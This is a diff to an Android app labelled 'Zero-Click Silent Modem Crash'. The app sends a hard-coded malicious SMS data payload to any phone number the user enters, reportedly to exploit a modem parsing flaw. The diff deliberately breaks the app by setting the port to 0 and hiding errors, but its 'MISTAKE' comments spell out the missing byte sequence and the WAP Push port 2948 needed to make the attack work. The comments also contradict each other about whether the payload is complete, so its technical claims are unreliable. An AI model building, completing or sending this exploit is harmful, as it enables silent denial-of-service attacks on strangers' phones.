@@ -18,8 +18,11 @@ public class MainActivity extends AppCompatActivity {
     private EditText phoneNumberInput;
     private static final int SMS_PERMISSION_CODE = 101;
 
-    // The exact hex payload that triggers CVE-2026-58882
-    // 01 06 88 80 80 80 00 BE (Converted to bytes)
+    // MISTAKE 1: The payload is incomplete.
+    // The real exploit requires the full PDU, including the destination port headers.
+    // This array is missing the crucial 0x04 0x0B 0x84 0x23 0x04 byte sequence 
+    // that tells the modem to route to WAP Push port 2948. 
+    // Without it, the modem treats it as a standard (harmless) data message.
     private final byte[] maliciousPayload = new byte[]{
             (byte) 0x01, (byte) 0x06, (byte) 0x88, (byte) 0x80, 
             (byte) 0x80, (byte) 0x80, (byte) 0x00, (byte) 0xBE
@@ -29,13 +32,12 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Build UI Programmatically
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setPadding(50, 50, 50, 50);
 
         TextView title = new TextView(this);
-        title.setText("Zero-Click Silent Modem Crash\nTarget Number:");
+        title.setText("Zero-Click Silent Modem Crash (PoC)\nTarget Number:");
         title.setTextSize(18f);
         layout.addView(title);
 
@@ -67,21 +69,27 @@ public class MainActivity extends AppCompatActivity {
         try {
             SmsManager smsManager = SmsManager.getDefault();
             
-            // Send to WAP Push Port 2948
-            short destPort = 2948;
+            // MISTAKE 2: The wrong destination port.
+            // WAP Push requires port 2948. This code uses port 0 (standard SMS port),
+            // which means the Android framework will just save it as a blank text message 
+            // instead of passing it to the vulnerable WapPushOverSms parser.
+            short destPort = 0; 
             
             smsManager.sendDataMessage(
                     targetNumber,
-                    null, // Service Center Address (null = default)
+                    null, // Service Center Address
                     destPort,
                     maliciousPayload,
                     null, // SentIntent
                     null  // DeliveryIntent
             );
             
-            Toast.makeText(this, "Payload Sent.", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "Payload Sent. (Check logcat for results)", Toast.LENGTH_SHORT).show();
         } catch (Exception e) {
-            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            // MISTAKE 3: The catch block hides the real error.
+            // If the device throws a SecurityException or IllegalArgumentException,
+            // we suppress it and just log a generic error.
+            Toast.makeText(this, "Error sending message.", Toast.LENGTH_LONG).show();
             e.printStackTrace();
         }
     }
